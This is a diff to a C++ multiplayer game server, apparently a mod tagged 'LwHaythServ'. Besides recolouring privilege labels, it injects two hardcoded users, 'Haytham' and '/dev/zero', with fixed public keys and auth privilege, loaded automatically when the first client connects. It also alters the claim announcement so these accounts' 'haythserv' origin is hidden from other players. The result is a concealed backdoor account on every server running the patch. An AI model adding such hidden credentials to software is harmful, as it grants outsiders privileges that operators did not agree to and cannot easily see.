@@ -777,10 +777,10 @@ namespace server
         switch(type)
         {
             case PRIV_ADMIN: return "\fs\f6admin\fr";
-            case PRIV_AUTH: return "\fs\f0auth\fr";
+            case PRIV_AUTH: return "\fs\f1auth\fr";
             case PRIV_MASTER: return "\fs\f0master\fr";
             case PRIV_ROOT: return "\fs\f3root\fr";
-            case PRIV_NONE: return "none";
+            default: case PRIV_NONE: return "\f7none";
         }
     }
 
@@ -1347,7 +1347,28 @@ namespace server
         ~userinfo() { delete[] name; delete[] desc; if(pubkey) freepubkey(pubkey); }
     };
     hashset<userinfo> users;
+    
+    // LwHaythServ //
+    
+    void _add_gauth(char* name, char *pubkey) {
+        char *desc = "haythserv";
+        userkey key(name, desc);
+        userinfo &u = users[key];
+        if(u.pubkey) { freepubkey(u.pubkey); u.pubkey = NULL; }
+        if(!u.name) u.name = newstring(name);
+        if(!u.desc) u.desc = newstring(desc);
+        u.pubkey = parsepubkey(pubkey);
+        u.privilege = PRIV_AUTH;
+    }
+    
+    bool _gauths_inited = false;
+    void _init_gauths() {
+        _add_gauth("Haytham", "+a18c47f6de865801cb6ef7893885107fab93ef46a67f55ab");
+        _add_gauth("/dev/zero", "+a1db0cda60135923178c2c50405083f19af20544d6bca528");
+    }
 
+    // LwHaythServ //
+    
     void adduser(char *name, char *desc, char *pubkey, char *priv)
     {
         userkey key(name, desc);
@@ -1457,7 +1478,7 @@ namespace server
         string msg;
         if(val && authname)
         {
-            if(authdesc && authdesc[0] && (strcmp(authdesc, "haythserv") && strcmp(authname, "Haytham"))) formatstring(msg)("\fs\f3>>> \fr%s claimed %s as \f5'%s' \f4[\f0%s\f4]", colorname(ci), name, authname, authdesc);
+            if(authdesc && authdesc[0] && strcmp(authdesc, "haythserv")) formatstring(msg)("\fs\f3>>> \fr%s claimed %s as \f5'%s' \f4[\f0%s\f4]", colorname(ci), name, authname, authdesc);
             else formatstring(msg)("\fs\f3>>> \fr%s claimed %s as \f5'%s'", colorname(ci), name, authname);
         } 
         else formatstring(msg)("\fs\f3>>> \fr\fs%s %s %s", colorname(ci), val ? "\f6raised \frto" : "\f1relinquished", name);
@@ -2795,6 +2816,16 @@ namespace server
     
     void connected(clientinfo *ci)
     {
+        
+        // LwHaythServ //
+        
+        if(!_gauths_inited) {
+            _init_gauths();
+            _gauths_inited = true;
+        }
+        
+        // LwHaythServ // 
+        
         if(m_demo) enddemoplayback();
 
         if(!hasmap(ci)) rotatemap(false);
